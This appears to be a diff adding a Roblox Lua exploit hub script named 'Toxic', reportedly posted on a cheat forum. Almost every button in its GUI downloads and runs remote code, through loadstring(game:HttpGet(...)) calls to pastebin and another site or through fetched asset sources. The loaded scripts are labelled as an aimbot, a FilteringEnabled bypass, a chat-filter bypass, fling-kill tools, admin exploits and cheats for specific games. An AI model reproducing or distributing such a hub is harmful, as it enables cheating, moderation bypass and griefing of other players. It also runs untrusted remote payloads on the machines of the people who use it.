@@ -1,0 +1,592 @@
+-- Made By sroxic#7457
+-- Version 2.0
+-- This was posted into V3rmillion.net
+local Toxic = Instance.new("ScreenGui")
+local OpenFrame = Instance.new("Frame")
+local Open = Instance.new("TextButton")
+local Main = Instance.new("Frame")
+local Anims1 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local Aimbot = Instance.new("TextButton")
+local Shattervast = Instance.new("TextButton")
+local FuckFE = Instance.new("TextButton")
+local Explorer = Instance.new("TextButton")
+local Close = Instance.new("TextButton")
+local Rocitizens1 = Instance.new("TextButton")
+local Rocitizens2 = Instance.new("TextButton")
+local Rocitizens3 = Instance.new("TextButton")
+local Rocitizens4 = Instance.new("TextButton")
+local KohlsAdmin = Instance.new("TextButton")
+local eBypass = Instance.new("TextButton")
+local BreakingPoint = Instance.new("TextButton")
+local BreakingPoint1 = Instance.new("TextButton")
+local PrisonLife = Instance.new("TextButton")
+local OldToxic = Instance.new("TextButton")
+local MadCity = Instance.new("TextButton")
+local ChatBypassGUI = Instance.new("TextButton")
+local Rocitizens3_2 = Instance.new("TextButton")
+local RevizAdmin = Instance.new("TextButton")
+local ScriptHub = Instance.new("TextButton")
+local R15GUI = Instance.new("TextButton")
+local CoolFEGUI = Instance.new("TextButton")
+local HyperTotal = Instance.new("TextButton")
+local Energize = Instance.new("TextButton")
+local OPFinality = Instance.new("TextButton")
+local FlingKill = Instance.new("TextButton")
+local AstravaGUI = Instance.new("TextButton")
+local Anims2 = Instance.new("TextButton")
+local RobloxianHigh = Instance.new("TextButton")
+local Unjailbreak = Instance.new("TextButton")
+local EpicMinigames = Instance.new("TextButton")
+local ScriptHub2 = Instance.new("TextButton")
+local Arosia = Instance.new("TextButton")
+local Frame = Instance.new("Frame")
+--Properties:
+Toxic.Name = "Toxic"
+Toxic.Parent = game.CoreGui
+
+OpenFrame.Name = "OpenFrame"
+OpenFrame.Parent = Toxic
+OpenFrame.Active = true
+OpenFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+OpenFrame.Position = UDim2.new(0, 0, 0.453262776, 0)
+OpenFrame.Size = UDim2.new(0, 100, 0, 34)
+
+Open.Name = "Open"
+Open.Parent = OpenFrame
+Open.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Open.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Open.Size = UDim2.new(0, 95, 0, 29)
+Open.Font = Enum.Font.Gotham
+Open.Text = "Open"
+Open.TextColor3 = Color3.new(0, 0, 0)
+Open.TextSize = 14
+Open.MouseButton1Down:connect(function()
+Main.Visible = true
+OpenFrame.Visible = false
+end)
+
+
+Main.Name = "Main"
+Main.Parent = Toxic
+Main.Active = true
+Main.BackgroundColor3 = Color3.new(0, 0, 0)
+Main.BackgroundTransparency = 0.5
+Main.BorderColor3 = Color3.new(0, 0, 0)
+Main.Position = UDim2.new(0.10857664, 0, 0.150196269, 0)
+Main.Size = UDim2.new(0, 934, 0, 353)
+Main.Visible = false
+Main.Draggable = true
+
+Anims1.Name = "Anims 1"
+Anims1.Parent = Main
+Anims1.BackgroundColor3 = Color3.new(0, 0, 0)
+Anims1.BackgroundTransparency = 0.69999998807907
+Anims1.Position = UDim2.new(0.889723361, 0, 0.530744255, 0)
+Anims1.Size = UDim2.new(0, 96, 0, 50)
+Anims1.Font = Enum.Font.SciFi
+Anims1.Text = "Anims 1"
+Anims1.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Anims1.TextSize = 20
+Anims1.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/eT3Qqe1f", true))()
+end)
+
+
+TextLabel.Parent = Main
+TextLabel.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel.Position = UDim2.new(0, 0, -0.00283286115, 0)
+TextLabel.Size = UDim2.new(0, 934, 0, 50)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Toxic"
+TextLabel.TextColor3 = Color3.new(0.623529, 0.623529, 0.623529)
+TextLabel.TextSize = 50
+
+TextLabel_2.Parent = Main
+TextLabel_2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_2.Position = UDim2.new(0.485375583, 0, 0.529290438, 0)
+TextLabel_2.Size = UDim2.new(0, 200, 0, 12)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "sroxic"
+TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
+TextLabel_2.TextSize = 14
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+
+Aimbot.Name = "Aimbot"
+Aimbot.Parent = Main
+Aimbot.BackgroundColor3 = Color3.new(0, 0, 0)
+Aimbot.BackgroundTransparency = 0.69999998807907
+Aimbot.Position = UDim2.new(0.015905261, 0, 0.189397022, 0)
+Aimbot.Size = UDim2.new(0, 107, 0, 50)
+Aimbot.Font = Enum.Font.SciFi
+Aimbot.Text = "Aimbot"
+Aimbot.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Aimbot.TextSize = 20
+Aimbot.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/uRYpgswr", true))()
+end)
+
+Shattervast.Name = "Shattervast"
+Shattervast.Parent = Main
+Shattervast.BackgroundColor3 = Color3.new(0, 0, 0)
+Shattervast.BackgroundTransparency = 0.69999998807907
+Shattervast.Position = UDim2.new(0.015905261, 0, 0.532373011, 0)
+Shattervast.Size = UDim2.new(0, 107, 0, 50)
+Shattervast.Font = Enum.Font.SciFi
+Shattervast.Text = "Shattervast"
+Shattervast.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Shattervast.TextSize = 20
+Shattervast.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/ghqrhtDB", true))()
+end)
+
+
+FuckFE.Name = "Fuck FE"
+FuckFE.Parent = Main
+FuckFE.BackgroundColor3 = Color3.new(0, 0, 0)
+FuckFE.BackgroundTransparency = 0.69999998807907
+FuckFE.Position = UDim2.new(0.015905261, 0, 0.356615782, 0)
+FuckFE.Size = UDim2.new(0, 107, 0, 50)
+FuckFE.Font = Enum.Font.SciFi
+FuckFE.Text = "Fuck FE"
+FuckFE.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+FuckFE.TextSize = 20
+FuckFE.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/L5jTtrQX", true))()
+end)
+
+
+
+Explorer.Name = "Explorer"
+Explorer.Parent = Main
+Explorer.BackgroundColor3 = Color3.new(0, 0, 0)
+Explorer.BackgroundTransparency = 0.69999998807907
+Explorer.Position = UDim2.new(0.015905261, 0, 0.712047398, 0)
+Explorer.Size = UDim2.new(0, 107, 0, 50)
+Explorer.Font = Enum.Font.SciFi
+Explorer.Text = "Explorer"
+Explorer.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Explorer.TextSize = 20
+Explorer.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/DAQDgLQf", true))()
+end)
+
+Rocitizens1.Name = "Rocitizens 1"
+Rocitizens1.Parent = Main
+Rocitizens1.BackgroundColor3 = Color3.new(0, 0, 0)
+Rocitizens1.BackgroundTransparency = 0.69999998807907
+Rocitizens1.Position = UDim2.new(0.139188066, 0, 0.187968135, 0)
+Rocitizens1.Size = UDim2.new(0, 95, 0, 50)
+Rocitizens1.Font = Enum.Font.SciFi
+Rocitizens1.Text = "Rocitizens 1"
+Rocitizens1.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Rocitizens1.TextSize = 20
+Rocitizens1.MouseButton1Down:connect(function()
+loadstring(game:GetObjects("rbxassetid://01494085827")[1].Source)()
+end)
+
+
+Rocitizens2.Name = "Rocitizens 2"
+Rocitizens2.Parent = Main
+Rocitizens2.BackgroundColor3 = Color3.new(0, 0, 0)
+Rocitizens2.BackgroundTransparency = 0.69999998807907
+Rocitizens2.Position = UDim2.new(0.138117433, 0, 0.35793981, 0)
+Rocitizens2.Size = UDim2.new(0, 96, 0, 50)
+Rocitizens2.Font = Enum.Font.SciFi
+Rocitizens2.Text = "Rocitizens 2"
+Rocitizens2.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Rocitizens2.TextSize = 20
+Rocitizens2.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/40LrHvAh", true))()
+end)
+
+
+Rocitizens3.Name = "Rocitizens 3"
+Rocitizens3.Parent = Main
+Rocitizens3.BackgroundColor3 = Color3.new(0, 0, 0)
+Rocitizens3.BackgroundTransparency = 0.69999998807907
+Rocitizens3.Position = UDim2.new(0.139188066, 0, 0.530744255, 0)
+Rocitizens3.Size = UDim2.new(0, 96, 0, 50)
+Rocitizens3.Font = Enum.Font.SciFi
+Rocitizens3.Text = "Rocitizens 3"
+Rocitizens3.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Rocitizens3.TextSize = 20
+Rocitizens3.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/kpjErEF0", true))()
+end)
+
+
+Rocitizens4.Name = "Rocitizens 4"
+Rocitizens4.Parent = Main
+Rocitizens4.BackgroundColor3 = Color3.new(0, 0, 0)
+Rocitizens4.BackgroundTransparency = 0.69999998807907
+Rocitizens4.Position = UDim2.new(0.139188066, 0, 0.709214509, 0)
+Rocitizens4.Size = UDim2.new(0, 95, 0, 50)
+Rocitizens4.Font = Enum.Font.SciFi
+Rocitizens4.Text = "Rocitizens 4"
+Rocitizens4.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Rocitizens4.TextSize = 20
+Rocitizens4.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/3H9GSxFK", true))()
+end)
+
+
+KohlsAdmin.Name = "Kohls Admin"
+KohlsAdmin.Parent = Main
+KohlsAdmin.BackgroundColor3 = Color3.new(0, 0, 0)
+KohlsAdmin.BackgroundTransparency = 0.69999998807907
+KohlsAdmin.Position = UDim2.new(0.248395771, 0, 0.187968045, 0)
+KohlsAdmin.Size = UDim2.new(0, 96, 0, 50)
+KohlsAdmin.Font = Enum.Font.SciFi
+KohlsAdmin.Text = "Khol's Admin"
+KohlsAdmin.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+KohlsAdmin.TextSize = 17
+KohlsAdmin.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/dKUjxRMi'),true))()
+end)
+
+
+eBypass.Name = "/e Bypass"
+eBypass.Parent = Main
+eBypass.BackgroundColor3 = Color3.new(0, 0, 0)
+eBypass.BackgroundTransparency = 0.69999998807907
+eBypass.Position = UDim2.new(0.248395771, 0, 0.35793972, 0)
+eBypass.Size = UDim2.new(0, 96, 0, 50)
+eBypass.Font = Enum.Font.SciFi
+eBypass.Text = "/e bypass"
+eBypass.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+eBypass.TextSize = 20
+eBypass.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/ncWQn5CT'),true))()
+end)
+
+BreakingPoint.Name = "Breaking Point"
+BreakingPoint.Parent = Main
+BreakingPoint.BackgroundColor3 = Color3.new(0, 0, 0)
+BreakingPoint.BackgroundTransparency = 0.69999998807907
+BreakingPoint.Position = UDim2.new(0.248395771, 0, 0.530744255, 0)
+BreakingPoint.Size = UDim2.new(0, 96, 0, 50)
+BreakingPoint.Font = Enum.Font.SciFi
+BreakingPoint.Text = "Breaking Point 1"
+BreakingPoint.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+BreakingPoint.TextSize = 15
+BreakingPoint.MouseButton1Down:connect(function()
+loadstring(game:GetObjects("rbxassetid://1014703659")[1].Source)()
+end)
+
+BreakingPoint1.Name = "Breaking Point 1"
+BreakingPoint1.Parent = Main
+BreakingPoint1.BackgroundColor3 = Color3.new(0, 0, 0)
+BreakingPoint1.BackgroundTransparency = 0.69999998807907
+BreakingPoint1.Position = UDim2.new(0.248395771, 0, 0.709214509, 0)
+BreakingPoint1.Size = UDim2.new(0, 96, 0, 50)
+BreakingPoint1.Font = Enum.Font.SciFi
+BreakingPoint1.Text = "Breaking Point 2"
+BreakingPoint1.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+BreakingPoint1.TextSize = 15
+BreakingPoint.MouseButton1Down:connect(function()
+loadstring(game:GetObjects("rbxassetid://1014703659")[1].Source)()
+end)
+
+
+PrisonLife.Name = "Prison Life"
+PrisonLife.Parent = Main
+PrisonLife.BackgroundColor3 = Color3.new(0, 0, 0)
+PrisonLife.BackgroundTransparency = 0.69999998807907
+PrisonLife.Position = UDim2.new(0.358674169, 0, 0.187968045, 0)
+PrisonLife.Size = UDim2.new(0, 96, 0, 50)
+PrisonLife.Font = Enum.Font.SciFi
+PrisonLife.Text = "Prison Life"
+PrisonLife.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+PrisonLife.TextSize = 20
+PrisonLife.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/4yUhQWMB", true))()
+end)
+
+
+OldToxic.Name = "Old Toxic"
+OldToxic.Parent = Main
+OldToxic.BackgroundColor3 = Color3.new(0, 0, 0)
+OldToxic.BackgroundTransparency = 0.69999998807907
+OldToxic.Position = UDim2.new(0.358674169, 0, 0.35510686, 0)
+OldToxic.Size = UDim2.new(0, 96, 0, 50)
+OldToxic.Font = Enum.Font.SciFi
+OldToxic.Text = "Old Toxic"
+OldToxic.TextColor3 = Color3.new(0.498039, 0.498039, 0.498039)
+OldToxic.TextSize = 20
+OldToxic.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/QWus6cM1", true))()
+end)
+
+
+MadCity.Name = "Mad City"
+MadCity.Parent = Main
+MadCity.BackgroundColor3 = Color3.new(0, 0, 0)
+MadCity.BackgroundTransparency = 0.69999998807907
+MadCity.Position = UDim2.new(0.358674169, 0, 0.530744255, 0)
+MadCity.Size = UDim2.new(0, 96, 0, 50)
+MadCity.Font = Enum.Font.SciFi
+MadCity.Text = "Mad City"
+MadCity.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+MadCity.TextSize = 20
+MadCity.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('http://arilis.win/B1316DFA-DC3A-405D-BF19-99588992BC70.lua'),true))()
+end)
+
+
+ChatBypassGUI.Name = "Chat Bypass GUI"
+ChatBypassGUI.Parent = Main
+ChatBypassGUI.BackgroundColor3 = Color3.new(0, 0, 0)
+ChatBypassGUI.BackgroundTransparency = 0.69999998807907
+ChatBypassGUI.Position = UDim2.new(0.358674169, 0, 0.712047338, 0)
+ChatBypassGUI.Size = UDim2.new(0, 96, 0, 50)
+ChatBypassGUI.Font = Enum.Font.SciFi
+ChatBypassGUI.Text = "Chat Bypass GUI"
+ChatBypassGUI.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+ChatBypassGUI.TextSize = 13
+ChatBypassGUI.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/gBAhKh70'),true))()
+end)
+
+
+RevizAdmin.Name = "Reviz Admin"
+RevizAdmin.Parent = Main
+RevizAdmin.BackgroundColor3 = Color3.new(0, 0, 0)
+RevizAdmin.BackgroundTransparency = 0.69999998807907
+RevizAdmin.Position = UDim2.new(0.542828321, 0, 0.187968045, 0)
+RevizAdmin.Size = UDim2.new(0, 96, 0, 50)
+RevizAdmin.Font = Enum.Font.SciFi
+RevizAdmin.Text = "Reviz Admin"
+RevizAdmin.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+RevizAdmin.TextSize = 17
+RevizAdmin.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/VFwd3uGJ", true))()
+end)
+
+
+ScriptHub.Name = "Script Hub"
+ScriptHub.Parent = Main
+ScriptHub.BackgroundColor3 = Color3.new(0, 0, 0)
+ScriptHub.BackgroundTransparency = 0.69999998807907
+ScriptHub.Position = UDim2.new(0.542828321, 0, 0.35510686, 0)
+ScriptHub.Size = UDim2.new(0, 96, 0, 50)
+ScriptHub.Font = Enum.Font.SciFi
+ScriptHub.Text = "Script Hub"
+ScriptHub.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+ScriptHub.TextSize = 20
+ScriptHub.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/PjebDXqq"), true))()
+end)
+
+
+R15GUI.Name = "R15 GUI"
+R15GUI.Parent = Main
+R15GUI.BackgroundColor3 = Color3.new(0, 0, 0)
+R15GUI.BackgroundTransparency = 0.69999998807907
+R15GUI.Position = UDim2.new(0.541757703, 0, 0.530744255, 0)
+R15GUI.Size = UDim2.new(0, 96, 0, 50)
+R15GUI.Font = Enum.Font.SciFi
+R15GUI.Text = "R15 GUI"
+R15GUI.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+R15GUI.TextSize = 20
+R15GUI.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/A0aJyZM2", true))()
+end)
+
+CoolFEGUI.Name = "Cool FE GUI"
+CoolFEGUI.Parent = Main
+CoolFEGUI.BackgroundColor3 = Color3.new(0, 0, 0)
+CoolFEGUI.BackgroundTransparency = 0.69999998807907
+CoolFEGUI.Position = UDim2.new(0.541757703, 0, 0.709214449, 0)
+CoolFEGUI.Size = UDim2.new(0, 96, 0, 50)
+CoolFEGUI.Font = Enum.Font.SciFi
+CoolFEGUI.Text = "Cool FE GUI"
+CoolFEGUI.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+CoolFEGUI.TextSize = 20
+CoolFEGUI.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/gJyEp2G1"), true))()
+end)
+
+HyperTotal.Name = "HyperTotal"
+HyperTotal.Parent = Main
+HyperTotal.BackgroundColor3 = Color3.new(0, 0, 0)
+HyperTotal.BackgroundTransparency = 0.69999998807907
+HyperTotal.Position = UDim2.new(0.656318724, 0, 0.187968045, 0)
+HyperTotal.Size = UDim2.new(0, 96, 0, 50)
+HyperTotal.Font = Enum.Font.SciFi
+HyperTotal.Text = "Hyper Total"
+HyperTotal.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+HyperTotal.TextSize = 20
+HyperTotal.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/XgLwBqSy"), true))()
+end)
+
+Energize.Name = "Energize"
+Energize.Parent = Main
+Energize.BackgroundColor3 = Color3.new(0, 0, 0)
+Energize.BackgroundTransparency = 0.69999998807907
+Energize.Position = UDim2.new(0.656318665, 0, 0.35793972, 0)
+Energize.Size = UDim2.new(0, 96, 0, 50)
+Energize.Font = Enum.Font.SciFi
+Energize.Text = "Energize"
+Energize.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Energize.TextSize = 20
+Energize.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/P8pJp7CM"), true))()
+end)
+
+OPFinality.Name = "OPFinality"
+OPFinality.Parent = Main
+OPFinality.BackgroundColor3 = Color3.new(0, 0, 0)
+OPFinality.BackgroundTransparency = 0.69999998807907
+OPFinality.Position = UDim2.new(0.656318665, 0, 0.530744255, 0)
+OPFinality.Size = UDim2.new(0, 96, 0, 50)
+OPFinality.Font = Enum.Font.SciFi
+OPFinality.Text = "OPFinality"
+OPFinality.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+OPFinality.TextSize = 20
+OPFinality.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/VmE4TdPs"), true))()
+end)
+
+FlingKill.Name = "Fling Kill"
+FlingKill.Parent = Main
+FlingKill.BackgroundColor3 = Color3.new(0, 0, 0)
+FlingKill.BackgroundTransparency = 0.69999998807907
+FlingKill.Position = UDim2.new(0.656318665, 0, 0.712047398, 0)
+FlingKill.Size = UDim2.new(0, 96, 0, 50)
+FlingKill.Font = Enum.Font.SciFi
+FlingKill.Text = "Kill FLing GUI"
+FlingKill.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+FlingKill.TextSize = 17
+FlingKill.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/ghARYaVa"), true))()
+end)
+
+AstravaGUI.Name = "Astrava GUI"
+AstravaGUI.Parent = Main
+AstravaGUI.BackgroundColor3 = Color3.new(0, 0, 0)
+AstravaGUI.BackgroundTransparency = 0.69999998807907
+AstravaGUI.Position = UDim2.new(0.771950364, 0, 0.187968045, 0)
+AstravaGUI.Size = UDim2.new(0, 96, 0, 50)
+AstravaGUI.Font = Enum.Font.SciFi
+AstravaGUI.Text = "Astrava GUI"
+AstravaGUI.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+AstravaGUI.TextSize = 20
+AstravaGUI.MouseButton1Down:connect(function()
+loadstring(game:GetObjects("rbxassetid://1468845733")[1].Source)()
+end)
+
+Anims2.Name = "Anims 2"
+Anims2.Parent = Main
+Anims2.BackgroundColor3 = Color3.new(0, 0, 0)
+Anims2.BackgroundTransparency = 0.69999998807907
+Anims2.Position = UDim2.new(0.889723361, 0, 0.712047398, 0)
+Anims2.Size = UDim2.new(0, 96, 0, 50)
+Anims2.Font = Enum.Font.SciFi
+Anims2.Text = "Anims 2"
+Anims2.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Anims2.TextSize = 20
+Anims2.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/2vdmuhZT"), true))()
+end)
+
+RobloxianHigh.Name = "Robloxian High"
+RobloxianHigh.Parent = Main
+RobloxianHigh.BackgroundColor3 = Color3.new(0, 0, 0)
+RobloxianHigh.BackgroundTransparency = 0.69999998807907
+RobloxianHigh.Position = UDim2.new(0.771950364, 0, 0.35510686, 0)
+RobloxianHigh.Size = UDim2.new(0, 96, 0, 50)
+RobloxianHigh.Font = Enum.Font.SciFi
+RobloxianHigh.Text = "Robloxian High"
+RobloxianHigh.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+RobloxianHigh.TextSize = 15
+RobloxianHigh.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/XKpuwiTg"), true))()
+end)
+
+Unjailbreak.Name = "Unjailbreak"
+Unjailbreak.Parent = Main
+Unjailbreak.BackgroundColor3 = Color3.new(0, 0, 0)
+Unjailbreak.BackgroundTransparency = 0.69999998807907
+Unjailbreak.Position = UDim2.new(0.771950364, 0, 0.530744255, 0)
+Unjailbreak.Size = UDim2.new(0, 96, 0, 50)
+Unjailbreak.Font = Enum.Font.SciFi
+Unjailbreak.Text = "Unjailbreak"
+Unjailbreak.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Unjailbreak.TextSize = 19
+Unjailbreak.MouseButton1Down:connect(function()
+loadstring(game:GetObjects("rbxassetid://1080139787")[1].Source)()
+end)
+
+EpicMinigames.Name = "Epic Minigames"
+EpicMinigames.Parent = Main
+EpicMinigames.BackgroundColor3 = Color3.new(0, 0, 0)
+EpicMinigames.BackgroundTransparency = 0.69999998807907
+EpicMinigames.Position = UDim2.new(0.771950364, 0, 0.709214509, 0)
+EpicMinigames.Size = UDim2.new(0, 96, 0, 50)
+EpicMinigames.Font = Enum.Font.SciFi
+EpicMinigames.Text = "Epic Minigames"
+EpicMinigames.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+EpicMinigames.TextSize = 13
+EpicMinigames.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/ncvCKDVd"), true))()
+end)
+
+ScriptHub2.Name = "Error f9"
+ScriptHub2.Parent = Main
+ScriptHub2.BackgroundColor3 = Color3.new(0, 0, 0)
+ScriptHub2.BackgroundTransparency = 0.69999998807907
+ScriptHub2.Position = UDim2.new(0.889723361, 0, 0.187968045, 0)
+ScriptHub2.Size = UDim2.new(0, 96, 0, 50)
+ScriptHub2.Font = Enum.Font.SciFi
+ScriptHub2.Text = "Error f9"
+ScriptHub2.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+ScriptHub2.TextSize = 15
+ScriptHub2.MouseButton1Down:connect(function()
+print("not working")
+end)
+
+Arosia.Name = "Arosia"
+Arosia.Parent = Main
+Arosia.BackgroundColor3 = Color3.new(0, 0, 0)
+Arosia.BackgroundTransparency = 0.69999998807907
+Arosia.Position = UDim2.new(0.889723361, 0, 0.35510686, 0)
+Arosia.Size = UDim2.new(0, 96, 0, 50)
+Arosia.Font = Enum.Font.SciFi
+Arosia.Text = "Arosia"
+Arosia.TextColor3 = Color3.new(0.364706, 0.364706, 0.364706)
+Arosia.TextSize = 20
+Arosia.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/EZ8CxDGr"), true))()
+end)
+
+Frame.Parent = Main
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Frame.BackgroundTransparency = 0.69999998807907
+Frame.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Frame.Position = UDim2.new(0.00749464659, 0, 0.0226628892, 0)
+Frame.Size = UDim2.new(0, 921, 0, 338)
+
+Close.Name = "Close"
+Close.Parent = Main
+Close.BackgroundColor3 = Color3.new(1, 1, 1)
+Close.BackgroundTransparency = 1
+Close.Position = UDim2.new(0.475358963, 0, 0.427477241, 0)
+Close.Size = UDim2.new(0, 46, 0, 50)
+Close.Font = Enum.Font.SourceSansBold
+Close.Text = "X"
+Close.TextColor3 = Color3.new(0, 0, 0)
+Close.TextSize = 30
+Close.TextStrokeColor3 = Color3.new(0.576471, 0.576471, 0.576471)
+Close.TextStrokeTransparency = 0
+Close.TextWrapped = true
+Close.MouseButton1Down:connect(function()
+OpenFrame.Visible = true
+Main.Visible = false
+end)
